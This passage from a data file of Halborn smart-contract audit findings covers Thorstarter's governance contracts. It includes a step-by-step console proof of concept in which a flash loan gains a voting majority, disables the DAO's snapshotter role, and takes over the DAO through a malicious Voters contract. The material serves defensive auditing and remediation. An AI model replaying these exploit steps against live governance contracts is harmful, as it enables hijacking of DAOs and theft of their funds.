proposal before calling delegate() function, so that the user who receives the voting power can not vote the same proposal again. Remediation Plan: SOLVED: Thorstarter Team modified the function function _valueAt() in the Voters.sol contract so when the function delegate() is called the voting power contained in a snapshot is not affected. 18 ",
        "labels": [
            "Halborn",
            "Thorstarter_Governance",
            "Severity: Critical"
        ]
    },
    {
        "title": "DOS/CONTRACT TAKEOVER ON DAO.SOL CONTRACT",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Thorstarter_Governance_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "DAO.sol contract allows the creation of different proposals including the following features:  Add support for pools: multiple options per proposal instead of just a for/against  Support multiple actions per option. So multiple transactions can be executed by one proposal  Use a voters contract to snapshot voting power, the address used The voting power is based on the locked XRUNE can be updated. (vXRUNE/voting token). its reconfigure  Can own parameters: minBalanceToPropose, minPercentQuorum, minVotingTime, minExecutionDelay  The execute method can be called by anybody if the proposal is passed and not yet executed Based on this, by doing a flash loan an attacker could: - Case 1: Cause a DOS in the contract - Case 2: Take total control of the DAO.sol contract The DAO.sol contract makes use of this Voters.sol contract to handle the voting for the different proposals, and as such, we have included this vulnerability in the report. Case 1: Cause a DOS in the contract - Manual test: In this case we have followed these steps to cause a DOS in the contract: 1. Perform a flash loan of XRUNEs and lock all those XRUNEs tokens so we obtain more than the 50% of the total voting power 2. Create a proposal which calls Voters.toggleSnapshotter(DAO address) 19 3. Return the flash loan 4. Give it our vote 5. Execute it This way, the contract DAO.sol will lose the snapshotters role in the Voters contract which is required to create a new proposal. Right after this call, no new proposals can be created. Listing 4: DOS through toggleSnapshotter() (Lines 64,67,76) 1 # Deploying test Token contracts 2 >>> accounts [0]. deploy ( XRuneToken ) 3 >>> accounts [0]. deploy ( OfferingToken ) 4 5 # Deploying contract Voters . sol - constructor ( address _owner , address _token , address _sushiLpToken ) 6 >>> accounts [0]. deploy ( Voters , accounts [0]. address , XRuneToken [0]. address , OfferingToken [0]. address ) 7 8 # Deploying contract DAO . sol - constructor ( address _voters , uint _minBalanceToPropose , uint _minPercentQuorum , uint _minVotingTime , uint _minExecutionDelay ) 9 >>> accounts [0]. deploy ( DAO , Voters [0]. address , 10 , 0, 0, 0) 10 11 # DAO contract should be a snapshotter of Voters . sol 12 >>> Voters [0]. toggleSnapshotter ( DAO [0]. address ) 13 14 # Example users 15 ## user1 33% of voting power 16 >>> user1 = accounts [1] 17 >>> XRuneToken [0]. transfer ( user1 . address , 33) 18 >>> XRuneToken [0]. approve ( Voters [0]. address , 33 , { ' from ': user1 }) 19 >>> Voters [0]. lock (33 , { ' from ': user1 }) 20 21 ## user2 16% of voting power 22 >>> user2 = accounts [2] 23 >>> XRuneToken [0]. transfer ( user2 , 16) 24 >>> XRuneToken [0]. approve ( Voters [0]. address , 16 , { ' from ': user2 }) 25 >>> Voters [0]. lock (16 , { ' from ': user2 }) 26 27 # attacker comes and performs a flash loan of XRUNE tokens to get 51% of the voting power 28 >>> attacker = accounts [9] 20 29 >>> XRuneToken [0]. transfer ( attacker , 51) 30 >>> XRuneToken [0]. approve ( Voters [0]. address , 51 , { ' from ': attacker }) 31 >>> Voters [0]. lock (51 , { ' from ': attacker }) 32 33 # Voting power 34 >>> print (\" votes ( user1 ) -> \" + str ( Voters [0]. votes ( user1 )) ) 35 votes ( user1 ) -> 33 36 >>> print (\" votes ( user2 ) -> \" + str ( Voters [0]. votes ( user2 )) ) 37 votes ( user2 ) -> 16 38 >>> print (\" votes ( attacker ) -> \" + str ( Voters [0]. votes ( attacker )) ) 39 votes ( attacker ) -> 51 40 41 # Attacker creates a proposal that calls Voters . toggleSnapshotter ( DAO ' s address ) 42 >>> encoded_toggleSnapshotter = Voters . signatures [' toggleSnapshotter '] + eth_abi . encode_abi ([ ' address ' ,] , ( DAO [0]. address ,) ). hex () 43 >>> bytes_toggleSnapshotter = to_bytes ( encoded_toggleSnapshotter , ' bytes ') 44 >>> actionBytes = eth_abi . encode_abi ([ ' address ', 'uint ', ' bytes '] , ( Voters [0]. address , 0, bytes_toggleSnapshotter )) . hex () 45 >>> proposalID = DAO [0]. propose (\" Title \", \" Description \", 10000 , 100 , [\" For \", \" Against \"] , [[ actionBytes ], []] , { ' from ': attacker }) 46 >>> proposalID = proposalID . return_value 47 >>> proposalID 48 1 49 50 # Attacker returns the flash loan 51 >>> Voters [0]. unlock (51 , { ' from ': attacker }) 52 53 # Attacker votes for his proposal 54 >>> DAO [0]. vote ( proposalID , 0, { ' from ': attacker }) 55 56 # The other users vote to reject the proposal 57 >>> DAO [0]. vote ( proposalID , 1, { ' from ': user1 }) 58 >>> DAO [0]. vote ( proposalID , 1, { ' from ': user2 }) 59 60 # After 24 hours ... 61 >>> chain . sleep (86401) 62 63 # Attacker executes the self - approved proposal 64 >>> DAO [0]. execute ( proposalID , { ' from ': attacker }) 21 65 Transaction sent : 0 xdb6533a7eeb2426681ac4eab6dc638 ... 66 Nonce : 5 67 Gas price : 0.0 gwei DAO . execute confirmed Gas limit : 6721975 Block : 13061360 Gas used : 63783 (0.95%) 68 69 < Transaction '0 xdb6533a7eeb2426681ac4eab6dc638 ... ' > 70 71 72 # Now another user comes and tries to create a new proposal 73 >>> DAO [0]. propose (\" Title \", \" Description \", 10000 , 100 , [\" For \", \" Against \"] , [[] , []] , { ' from ': user1 }) 74 Transaction sent : 0 x6449063f2cc6b237dd5f7693a76c7e ... 75 Nonce : 3 76 Gas price : 0.0 gwei DAO . propose confirmed ( not snapshotter ) Gas limit : 6721975 Block : 13061361 Gas used : 30712 (0.46%) 77 78 < Transaction '0 x6449063f2cc6b237dd5f7693a76c7e ... ' > Case 2: Take total control of the DAO.sol contract - Manual test: For this case we have followed these steps to take control of the DAO contract: 1. Create a malicious contract called EvilVoters.sol with the same structure and similar code as the current Voters.sol contract 2. Initialize the EvilVoters.sol contract with our own fake tokens 3. Add the DAO.sol contract address as an snapshotter of our malicious contract 4. Perform a flash loan of XRUNEs and lock all those XRUNE tokens so we obtain more than the 50% of the total voting power 5. Create a proposal which calls DAO.setVoters(EvilVoters.sol's address ) 6. Return the flash loan 7. Give it our vote 8. Execute it After the proposal is executed the new voters contract will be our In this contract, we are the only ones that have malicious contract. 22 tokens which give us total control over the DAO contract to propose and execute anything. Listing 5: 100,103,162,165) DAO Contract takeover through DAO.setVoters() (Lines 1 # Deploying test Token contracts ... 2 >>> accounts [0]. deploy ( XRuneToken ) 3 >>> accounts [0]. deploy ( OfferingToken ) 4 5 # Deploying contract Voters . sol - constructor ( address _owner , address _token , address _sushiLpToken ) 6 >>> accounts [0]. deploy ( Voters , accounts [0]. address , XRuneToken [0]. address , OfferingToken [0]. address ) 7 8 # Deploying contract DAO . sol - constructor ( address _voters , uint _minBalanceToPropose , uint _minPercentQuorum , uint _minVotingTime , uint _minExecutionDelay ) 9 >>> accounts [0]. deploy ( DAO , Voters [0]. address , 10 , 0, 0, 0) 10 11 # Adding DAO contract as a snapshotter of Voters . sol 12 >>> Voters [0]. toggleSnapshotter ( DAO [0]. address ) 13 14 # Example users 15 ## user1 33% of voting power 16 ### Giving user 1 33% of the voting power 17 >>> user1 = accounts [1] 18 >>> XRuneToken [0]. transfer ( user1 . address , 33) 19 >>> XRuneToken [0]. approve ( Voters [0]. address , 33 , { ' from ': user1 }) 20 >>> Voters [0]. lock (33 , { ' from ': user1 }) 21 22 ## user2 16% of voting power 23 ### Giving user 2 16% of the voting power 24 >>> user2 = accounts [2] 25 >>> XRuneToken [0]. transfer ( user2 , 16) 26 >>> XRuneToken [0]. approve ( Voters [0]. address , 16 , { ' from ': user2 }) 27 >>> Voters [0]. lock (16 , { ' from ': user2 }) 28 29 ## attacker creates a new Voters . sol contract with his own fake tokens which are FakeToken1 and FakeToken2 30 >>> attacker = accounts [9] 31 ### Deploying FakeToken contracts ... 32 >>> attacker . deploy ( FakeToken1 ) 33 >>> attacker . deploy ( FakeToken2 ) 23 34 35 ### deploying malicious Voters contract ... 36 >>> attacker . deploy ( Voters , attacker . address , FakeToken1 [0]. address , FakeToken2 [0]. address ) 37 38 ### Adding DAO contract as a snapshotter of the malicious Voters . sol 39 >>> Voters [1]. toggleSnapshotter ( DAO [0]. address ) 40 41 ## Voters [0] -> Original voters contract 42 ## Voters [1] -> Malicious voters contract created by the attacker 43 ### Attacker locks 1000000 FakeTokens1 in the malicious voters contract 44 >>> FakeToken1 [0]. transfer ( attacker , 1000000) 45 >>> FakeToken1 [0]. approve ( Voters [1]. address , 1000000 , { ' from ': attacker }) 46 >>> Voters [1]. lock (1000000 , { ' from ': attacker }) 47 >>> print (\" Attacker voting power in the malicious voters contract -> \" + str ( Voters [1]. votes ( attacker )) + \"\\ n \") 48 Attacker voting power in the malicious voters contract -> 1000000 49 50 ## attacker comes and performs a flash loan of XRUNE tokens to get 51% of the voting power in the original voters contract 51 >>> XRuneToken [0]. transfer ( attacker , 51) 52 >>> XRuneToken [0]. approve ( Voters [0]. address , 51 , { ' from ': attacker }) 53 >>> Voters [0]. lock (51 , { ' from ': attacker }) 54 55 # Voting power 56 >>> print () 57 print (\" Voting power in the original voters contract \") 58 print (\" votes ( user1 ) -> \" + str ( Voters [0]. votes ( user1 )) ) 59 print (\" votes ( user2 ) -> \" + str ( Voters [0]. votes ( user2 )) ) 60 print (\" votes ( attacker ) -> \" + str ( Voters [0]. votes ( attacker )) ) 61 print () 62 print (\" Voting power in the malicious voters contract \") 63 print (\" votes ( user1 ) -> \" + str ( Voters [1]. votes ( user1 )) ) 64 print (\" votes ( user2 ) -> \" + str ( Voters [1]. votes ( user2 )) ) 65 print (\" votes ( attacker ) -> \" + str ( Voters [1]. votes ( attacker )) ) 66 print () 67 68 Voting power in the original voters contract 69 votes ( user1 ) -> 33 70 votes ( user2 ) -> 16 24 71 votes ( attacker ) -> 51 72 73 Voting power in the malicious voters contract 74 votes ( user1 ) -> 0 75 votes ( user2 ) -> 0 76 votes ( attacker ) -> 1000000 77 78 # Attacker creates a proposal that calls setVoters ( Malicious voters contract address ) 79 >>> encoded_setVoters = DAO . signatures [ ' setVoters '] + eth_abi . encode_abi ([ ' address ' ,] , ( Voters [1]. address ,) ). hex () 80 >>> bytes_setVoters = to_bytes ( encoded_setVoters , ' bytes ') 81 >>> actionBytes = eth_abi . encode_abi ([ ' address ', 'uint ', ' bytes '] , ( DAO [0]. address , 0, bytes_setVoters )) . hex () 82 >>> proposalID = DAO [0]. propose (\" Title \", \" Description \", 10000 , 100 , [\" For \", \" Against \"] , [[ actionBytes ], []] , { ' from ': attacker }) 83 >>> print (\" ProposalID -> \" + str ( proposalID ) + \"\\ n \") 84 ProposalID -> 1 85 86 # Attacker returns the flash loan . This is done before voting for its own proposal , as the voting power used by the smart contract is the voting power that the users had at the time of the proposal creation 87 >>> Voters [0]. unlock (51 , { ' from ': attacker }) 88 89 # Attacker votes to approve his own proposal 90 >>> DAO [0]. vote ( proposalID , 0, { ' from ': attacker }) 91 92 # The other users vote to reject the proposal 93 >>> DAO [0]. vote ( proposalID , 1, { ' from ': user1 }) 94 >>> DAO [0]. vote ( proposalID , 1, { ' from ': user2 }) 95 96 # After 24 hours ... 97 >>> chain . sleep (86401) 98 99 # Attacker executes the proposal 100 >>> DAO [0]. execute ( proposalID , { ' from ': attacker }) 101 Transaction sent : 0 xca6d0d8e67b51644c81535b2435303e ... 102 Nonce : 12 103 Gas price : 0.0 gwei DAO . execute confirmed Gas limit : 6721975 Block : 13069245 Gas used : 77831 (1.16%) 104 105 < Transaction '0 xca6d0d8e67b51644c81535b2435303e ... ' > 25 106 107 ## Let 's give now a lot of voting power to the user1 and user2 108 >>> XRuneToken [0]. transfer ( user1 , 500000000 e10 ) 109 >>> XRuneToken [0]. approve ( Voters [0]. address , 500000000 e10 , { ' from ': user1 }) 110 >>> Voters [0]. lock (500000000 e10 , { ' from ': user1 }) 111 >>> XRuneToken [0]. transfer ( user2 , 500000000 e10 ) 112 >>> XRuneToken [0]. approve ( Voters [0]. address , 500000000 e10 , { ' from ': user2 }) 113 >>> Voters [0]. lock (500000000 e10 , { ' from ': user2 }) 114 115 # Voting power 116 >>> print () 117 print (\" Voting power in the original voters contract \") 118 print (\" votes ( user1 ) -> \" + str ( Voters [0]. votes ( user1 )) ) 119 print (\" votes ( user2 ) -> \" + str ( Voters [0]. votes ( user2 )) ) 120 print (\" votes ( attacker ) -> \" + str ( Voters [0]. votes ( attacker )) ) 121 print () 122 print (\" Voting power in the malicious voters contract \") 123 print (\" votes ( user1 ) -> \" + str ( Voters [1]. votes ( user1 )) ) 124 print (\" votes ( user2 ) -> \" + str ( Voters [1]. votes ( user2 )) ) 125 print (\" votes ( attacker ) -> \" + str ( Voters [1]. votes ( attacker )) ) 126 print () 127 128 Voting power in the original voters contract 129 votes ( user1 ) -> 5000000000000000033 130 votes ( user2 ) -> 5000000000000000016 131 votes ( attacker ) -> 0 132 133 Voting power in the malicious voters contract 134 votes ( user1 ) -> 0 135 votes ( user2 ) -> 0 136 votes ( attacker ) -> 1000000 137 138 ## attacker creates a new proposal to setMinBalanceToPropose to 1000000 139 >>> encoded_setMinBalanceToPropose = DAO . signatures [' setMinBalanceToPropose '] + eth_abi . encode_abi ([ ' uint256 ' ,] , (1000000 ,) ). hex () 140 >>> bytes_setMinBalanceToPropose = to_bytes ( encoded_setMinBalanceToPropose ,' bytes ') 141 >>> actionBytes = eth_abi . encode_abi ([ ' address ', 'uint ', ' bytes '] , ( DAO [0]. address , 0, bytes_setMinBalanceToPropose )) . hex () 142 >>> proposalID = DAO [0]. propose (\" Title \", \" Description \", 10000 , 26 100 , [\" For \", \" Against \"] , [[ actionBytes ], []] , { ' from ': attacker }) 143 >>> proposalID = proposalID . return_value 144 >>> print (\" Second proposal created by the attacker - ProposalID -> \" + str ( proposalID ) + \"\\ n \") 145 Second proposal created by the attacker - ProposalID -> 2 146 147 # Attacker votes to approve it 148 >>> DAO [0]. vote ( proposalID , 0, { ' from ': attacker }) 149 150 # User1 and user2 vote to reject it 151 >>> DAO [0]. vote ( proposalID , 0, { ' from ': user1 }) 152 >>> DAO [0]. vote ( proposalID , 0, { ' from ': user2 }) 153 154 # Finish the voting period 155 >>> chain . sleep (86401) 156 157 # We check the minBalanceToPropose before executing the proposal 158 >>> print (\" minBalanceToPropose before executing the proposal -> \" + str ( DAO [0]. minBalanceToPropose () ) + \"\\ n \") 159 minBalanceToPropose before executing the proposal -> 10 160 161 # Execute the proposal 162 >>> DAO [0]. execute ( proposalID , { ' from ': attacker }) 163 Transaction sent : 0 x5cdb022231acb822c48c4ffe8c58aab675 ... 164 165 Gas price : 0.0 gwei DAO . execute confirmed Gas limit : 6721975 Block : 13069256 Nonce : 15 Gas used : 76851 (1.14%) 166 167 < Transaction '0 x5cdb022231acb822c48c4ffe8c58aab675 ... ' > 168 169 # Get the value of minBalanceToPropose after executing the proposal 170 >>> print (\" minBalanceToPropose after executing the proposal -> \" + str ( DAO [0]. minBalanceToPropose () )) 171 minBalanceToPropose after executing the proposal -> 1000000 Risk Level: Likelihood - 3 Impact - 5 27 Recommendation: In the current Voters.sol contract, the tokens locked should take a fixed If a malicious user period of time before they grant voting power. performs a flash loan of XRUNE tokens and locks them, they will not get their voting power increased before they have to return the flash loan. So, it is recommended not allowing to lock() and unlock() XRUNE in the same transaction. Remediation Plan: SOLVED: Thorstarter Team rightly implemented a fix to mitigate the risk of flash loans by not allowing to lock() unlock() XRUNE in the same transaction. 28 ",
        "labels": [
            "Halborn",
            "Thorstarter_Governance",
            "Severity: High"
        ]
    },
    {
        "title": "DOS WITH BLOCK GAS LIMIT",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Thorstarter_Governance_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "When smart contracts are deployed or functions inside them are called, the execution of these actions always require a certain amount of gas, based on how much computation is needed to complete them. The Ethereum network specifies a block gas limit and the sum of all transactions included in a block cannot exceed the threshold. Programming patterns that are harmless in centralized applications can lead to Denial of Service conditions in smart contracts when the cost of executing a function exceeds the block gas limit. In this contract, the function updateTclp() iterates over an array of users of unknown size, which is passed as a parameter of the function. If this array is big enough, the transaction could reach the block gas limit and would not be completed. Code Location: Listing 6: Voters.sol (Lines 265) 262 function updateTclp ( address [] calldata users , uint [] calldata 263 264 265 266 267 268 269 270 271 272 273 274 amounts , uint [] calldata values ) public { require ( tcLpKeepers [ msg . sender ], \" not tcLpKeeper \" ); require ( users . length == amounts . length && users . length == values . length , \" length \" ); for ( uint i = 0; i < users . length ; i ++) { address user = users [ i ]; UserInfo storage userInfo = _userInfo ( user ); _updateSnapshot ( _totalSupplySnapshots , totalSupply ); _updateSnapshot ( _balancesSnapshots [ user ], balanceOf ( user )) ; _updateSnapshot ( _votesSnapshots [ userInfo . delegate ], votes ( userInfo . delegate )) ; uint previousValue = userInfo . lockedTcLpValue ; totalSupply = totalSupply - previousValue + values [ i ]; _votes [ userInfo . delegate ] = _votes [ userInfo . delegate ] - previousValue + values [i ]; 29 275 276 277 278 279 280 281 282 283 284 285 286 287 288 289 } userInfo . lockedTcLpValue = values [ i ]; userInfo . lockedTcLpAmount = amounts [i ]; if ( previousValue < values [ i ]) { emit Transfer ( address (0) , user , values [ i] - previousValue ); } else if ( previousValue > values [ i ]) { emit Transfer ( user , address (0) , previousValue - values [ i ]) ; } // Add to historicalTcLpsList for keepers to use if (! historicalTcLps [ user ]) { historicalTcLps [ user ] = true ; _historicalTcLpsList . push ( user ); } } Risk Level: Likelihood - 2 Impact - 3 Recommendation: Actions that require looping across the entire data structure should be avoided. If you use loop over an array of unknown size, you should plan for it to potentially take multiple blocks, and therefore require multiple transactions. In this case, the size of the users array should be limited to a fixed maximum value. Remediation Plan: ACKNOWLEDGED: Thorstarter Team accepts this risk because the updateTclp() function can only be called by someone with a Keeper role. 30 ",
        "labels": [
            "Halborn",
            "Thorstarter_Governance",
            "Severity: Low"
        ]
    },
    {
        "title": "CONTRACT CAN BE LEFT WITHOUT ANY SNAPSHOTTER/KEEPER",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Thorstarter_Governance_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "The contract contains two functions called toggleSnapshotter() and These functions can be only called by an already toggleTcLpKeeper(). snapshotter/keeper respectively. If there is just one snapshotter or keeper and it calls these functions with its own address, the contract would be left without any snapshotter/keeper and it would never be able to have any snapshotter/keeper again. If this happens, proposals would never work in the DAO.sol contract, as this contract requires the snapshotter role and there would be no way to add it. Code Location: Listing 7: Voters.sol (Lines 114,119) require ( snapshotters [ msg . sender ], \" not snapshotter \"); snapshotters [ user ] = ! snapshotters [ user ]; 112 function toggleSnapshotter ( address user ) external { 113 114 115 } 116 117 function toggleTcLpKeeper ( address user ) external { 118 119 120 } require ( tcLpKeepers [ msg . sender ], \" not tsLpKeeper \" ); tcLpKeepers [ user ] = ! tcLpKeepers [ user ]; Risk Level: Likelihood - 2 Impact - 3 31 Recommendation: Use OpenZeppelin Access Control library to manage the different roles of the contracts. Using this OpenZeppelin library the roles can be granted and revoked dynamically via the grantRole and revokeRole functions. Each role has an associated admin role, and only accounts that have a roles admin role can call grantRole and revokeRole. Remediation Plan: SOLVED: Thorstarter Team successfully added the OpenZeppelin Access Control library into the Voters.sol contract. 32 ",
        "labels": [
            "Halborn",
            "Thorstarter_Governance",
            "Severity: Low"
        ]
    },
    {
        "title": "INCOMPATIBILITY WITH INFLATIONARY TOKENS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Thorstarter_Governance_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "In multiple functions Thorstarter uses OpenZeppelins safeTransferFrom and safeTransfer to handle the token transfers. These functions call transferFrom and transfer internally in the token contract to actually execute the transfer. However, since the actual amount transferred i.e. the delta of previous (before transfer) and current (after transfer) balance is not verified, a malicious user may list a custom ERC20 token with the transferFrom or transfer function modified in such a way that it e.g. does not transfer any tokens at all and the attacker is still going to have their liquidity pool tokens minted anyway. In this case both tokens are set in the constructor by the creator of the contract, so they are trusted, but it would be still a good practice to perform this check. Code Location: Voters.sol Listing 8: Voters.sol 176 token . safeTransferFrom ( msg . sender , address ( this ) , amount ); Listing 9: Voters.sol 202 token . safeTransfer ( msg . sender , amount ); Listing 10: Voters.sol 209 sushiLpToken . safeTransferFrom ( msg . sender , address ( this ) , lpAmount ) ; 33 Listing 11: Voters.sol 256 sushiLpToken . safeTransfer ( msg . sender , lpAmount ); Listing 12: Voters.sol 312 token . safeTransferFrom ( msg . sender , address ( this ) , amount ); OpenZeppelin Listing 13: Library SafeERC20 (Lines 20,25,28,34) using Address for address ; 17 library SafeERC20 { 18 19 20 21 22 23 24 25 function safeTransfer ( IERC20 token , address to , uint256 value ) internal { _callOptionalReturn ( token , abi . encodeWithSelector ( token . transfer . selector , to , value )) ; } function safeTransferFrom ( IERC20 token , address from , address to , uint256 value ) internal { _callOptionalReturn ( token , abi . encodeWithSelector ( token . transferFrom . selector , from , to , value )) ; } 26 27 28 29 30 31 32 33 34 35 Risk Level: Likelihood - 1 Impact - 3 34 Recommendation: Whenever tokens are transferred, the delta of the previous (before transfer) and current (after transfer) token balance should be verified to match the user-declared token amount. Remediation Plan: SOLVED: Thorstarter Team checks now the token balance before and after every token transfer. 35 ",
        "labels": [
            "Halborn",
            "Thorstarter_Governance",
            "Severity: Low"
        ]
    },
    {
        "title": "LACK OF ZERO ADDRESS CHECK",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Thorstarter_Governance_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "Lack of zero address validation has been found at many instances in the contract Voters.sol when assigning user supplied input. Functions updateTclp(), delegate(), toggleSnapshotter(), _userInfo() and the constructor are missing this check. toggleTcLpKeeper(), Code Location: Listing 14: Voters.sol 55 constructor ( address _owner , address _token , address _sushiLpToken ) { snapshotters [ _owner ] = true ; tcLpKeepers [ _owner ] = true ; token = IERC20 ( _token ); sushiLpToken = IERC20 ( _sushiLpToken ); currentSnapshotId = 1; 56 57 58 59 60 61 } Listing 15: Voters.sol require ( snapshotters [ msg . sender ], \" not snapshotter \"); snapshotters [ user ] = ! snapshotters [ user ]; 112 function toggleSnapshotter ( address user ) external { 113 114 115 } 116 117 function toggleTcLpKeeper ( address user ) external { 118 119 120 } require ( tcLpKeepers [ msg . sender ], \" not tsLpKeeper \" ); tcLpKeepers [ user ] = ! tcLpKeepers [ user ]; 36 Listing 16: Voters.sol 161 function delegate ( address delegatee ) external { 162 163 164 165 166 UserInfo storage userInfo = _userInfos [ msg . sender ]; address currentDelegate = userInfo . delegate ; userInfo . delegate = delegatee ; _updateSnapshot ( _votesSnapshots [ currentDelegate ], votes ( currentDelegate )) ; 167 _updateSnapshot ( _votesSnapshots [ delegatee ], votes ( delegatee )) ; uint amount = balanceOf ( msg . sender ); _votes [ currentDelegate ] -= amount ; _votes [ delegatee ] += amount ; emit DelegateChanged ( msg . sender , currentDelegate , delegatee ); 168 169 170 171 172 173 } Listing 17: Voters.sol 262 function updateTclp ( address [] calldata users , uint [] calldata amounts , uint [] calldata values ) public { require ( tcLpKeepers [ msg . sender ], \" not tcLpKeeper \" ); require ( users . length == amounts . length && users . length == values . length , \" length \" ); for ( uint i = 0; i < users . length ; i ++) { address user = users [ i ]; UserInfo storage userInfo = _userInfo ( user ); _updateSnapshot ( _totalSupplySnapshots , totalSupply ); _updateSnapshot ( _balancesSnapshots [ user ], balanceOf ( user )) ; _updateSnapshot ( _votesSnapshots [ userInfo . delegate ], votes ( userInfo . delegate )) ; uint previousValue = userInfo . lockedTcLpValue ; totalSupply = totalSupply - previousValue + values [ i ]; _votes [ userInfo . delegate ] = _votes [ userInfo . delegate ] - previousValue + values [i ]; userInfo . lockedTcLpValue = values [ i ]; userInfo . lockedTcLpAmount = amounts [i ]; if ( previousValue < values [ i ]) { emit Transfer ( address (0) , msg . sender , values [ i] - previousValue ); } else { 263 264 265 266 267 268 269 270 271 272 273 274 275 276 277 278 279 37 emit Transfer ( msg . sender , address (0) , previousValue - values [i ]) ; 280 281 282 283 } } } Listing 18: Voters.sol 291 292 293 294 295 296 297 298 299 300 301 302 303 304 305 306 307 308 309 310 311 312 313 function _userInfo ( address user ) private returns ( UserInfo storage ) { UserInfo storage userInfo = _userInfos [ user ]; if ( userInfo . delegate == address (0) ) { userInfo . delegate = user ; } if ( userInfo . lastFeeGrowth == 0) { userInfo . lastFeeGrowth = lastFeeGrowth ; } else { uint fees = ( _userInfoTotal ( userInfo ) * ( lastFeeGrowth - userInfo . lastFeeGrowth )) / 1 e12 ; if ( fees > 0) { _updateSnapshot ( _totalSupplySnapshots , totalSupply ); _updateSnapshot ( _balancesSnapshots [ user ], balanceOf ( user )) ; _updateSnapshot ( _votesSnapshots [ userInfo . delegate ], votes ( userInfo . delegate )) ; totalSupply += fees ; userInfo . lockedToken += fees ; userInfo . lastFeeGrowth = lastFeeGrowth ; _votes [ userInfo . delegate ] += fees ; emit Transfer ( address (0) , user , fees ); } } return userInfo ; } Risk Level: Likelihood - 3 Impact - 2 38 Recommendation: Add proper address validation when every state variable assignment is done from user supplied input. Remediation Plan: SOLVED: Thorstarter Team added address validation to all the untrusted functions: delegate(), _userInfo() 39 ",
        "labels": [
            "Halborn",
            "Thorstarter_Governance",
            "Severity: Low"
        ]
    },
    {
        "title": "CHECK VARIABLE IS NOT EQUAL TO ZERO",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Thorstarter_Governance_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "In the function lockSslp() the variable lpTokenSupply is used as denominator in a division. This variable should be checked that is different than zero. Code Location: Listing 19: Voters.sol (Lines 226,228) 223 // Calculated updated * full * LP amount value and set ( not increment ) 224 // We do it like this and not based on just amount added so that unlock 225 // knows that the lockedSsLpValue is based on one rate and not multiple adds 226 uint lpTokenSupply = sushiLpToken . totalSupply () ; 227 uint lpTokenReserve = token . balanceOf ( address ( sushiLpToken )) ; 228 uint amount = (2 * userInfo . lockedSsLpAmount * lpTokenReserve ) / lpTokenSupply ; Risk Level: Likelihood - 1 Impact - 1 Recommendation: Add a require statement that checks that the variable lpTokenSupply is not equal to zero. 40 Remediation Plan: SOLVED: Thorstarter Team rightly added the require statement that checks that the variable lpTokenSupply is not equal to zero. 41 ",
        "labels": [
            "Halborn",
            "Thorstarter_Governance",
            "Severity: Informational"
        ]
    },
    {
        "title": "MISSING REQUIRE STATEMENT",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Thorstarter_Governance_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "In the function unlockSslp(), in order to save some gas, a require statement could be added at the beginning of the function as there is nothing to do/decrement if the lpAmount equals to zero. Code Location: Listing 20: Voters.sol (Lines 255) 239 function unlockSslp ( uint lpAmount ) external { 240 241 UserInfo storage userInfo = _userInfo ( msg . sender ); require ( lpAmount <= userInfo . lockedSsLpAmount , \" locked balance too low \" ); 242 243 244 245 246 247 248 249 250 251 252 253 254 255 256 257 258 } _updateSnapshot ( _totalSupplySnapshots , totalSupply ); _updateSnapshot ( _balancesSnapshots [ msg . sender ], balanceOf ( msg . sender )); _updateSnapshot ( _votesSnapshots [ userInfo . delegate ], votes ( userInfo . delegate )) ; // Proportionally decrement lockedSsLpValue & supply & delegated votes uint amount = lpAmount * userInfo . lockedSsLpValue / userInfo . lockedSsLpAmount ; totalSupply -= amount ; userInfo . lockedSsLpValue -= amount ; userInfo . lockedSsLpAmount -= lpAmount ; _votes [ userInfo . delegate ] -= amount ; emit Transfer ( msg . sender , address (0) , amount ); if ( lpAmount > 0) { sushiLpToken . safeTransfer ( msg . sender , lpAmount ); } 42 Risk Level: Likelihood - 1 Impact - 2 Recommendation: Add a require statement that checks that lpAmount is not zero at the beginning of the function. Example code Listing 21: Voters.sol (Lines 240,256) 239 function unlockSslp ( uint lpAmount ) external { 240 241 242 require ( lpAmount > 0, \" lpAmount == 0 \"); UserInfo storage userInfo = _userInfo ( msg . sender ); require ( lpAmount <= userInfo . lockedSsLpAmount , \" locked balance too low \" ); 243 244 245 246 247 248 249 250 251 252 253 254 255 256 257 } _updateSnapshot ( _totalSupplySnapshots , totalSupply ); _updateSnapshot ( _balancesSnapshots [ msg . sender ], balanceOf ( msg . sender )); _updateSnapshot ( _votesSnapshots [ userInfo . delegate ], votes ( userInfo . delegate )) ; // Proportionally decrement lockedSsLpValue & supply & delegated votes uint amount = lpAmount * userInfo . lockedSsLpValue / userInfo . lockedSsLpAmount ; totalSupply -= amount ; userInfo . lockedSsLpValue -= amount ; userInfo . lockedSsLpAmount -= lpAmount ; _votes [ userInfo . delegate ] -= amount ; emit Transfer ( msg . sender , address (0) , amount ); sushiLpToken . safeTransfer ( msg . sender , lpAmount ); 43 Remediation Plan: SOLVED: Thorstarter Team rightly added the require statement that checks that lpAmount is not zero. 44 ",
        "labels": [
            "Halborn",
            "Thorstarter_Governance",
            "Severity: Informational"
        ]
    },
    {
        "title": "SIGNATURE VALIDATION CAN BE BYPASSED",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Sienna_Network_AMM_Protocol_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
